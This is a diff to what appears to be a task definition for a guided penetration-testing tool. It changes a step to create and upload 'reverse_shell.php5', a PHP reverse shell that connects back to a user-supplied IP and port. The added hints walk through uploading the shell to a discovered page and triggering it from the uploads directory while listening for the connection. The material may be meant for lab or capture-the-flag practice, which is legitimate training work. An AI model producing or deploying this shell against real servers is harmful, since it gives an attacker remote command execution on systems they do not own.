@@ -1,4 +1,4 @@
-description: upload file
+description: create and upload reverse_shell.php5
 function: create_file
 In: [myIP, port]
 condition: 
@@ -53,8 +53,8 @@ argument:
 
     set_time_limit (0);
     $VERSION = "1.0";
-    $ip = 'REPLACE_IT_IP'; // CHANGE THIS
-    $port = REPLACE_IT_PORT;       // CHANGE THIS
+    $ip = 'REPLACE_IT_myIP'; // CHANGE THIS
+    $port = REPLACE_IT_port;       // CHANGE THIS
     $chunk_size = 1400;
     $write_a = null;
     $error_a = null;
@@ -194,4 +194,8 @@ argument:
     }
 
     ?> 
+  - reverse_shell.php5
 hint:
+  - +FORMAT+\nGo to /home/{getpass.getuser()}/Desktop/, you would find {args[1]}.
+  - "Upload it to the <IP>/{existing page you found}, ex: <IP>/panel."
+  - Go to the <IP>/uploads page, click the file to execute (Make sure you listening to the port first).
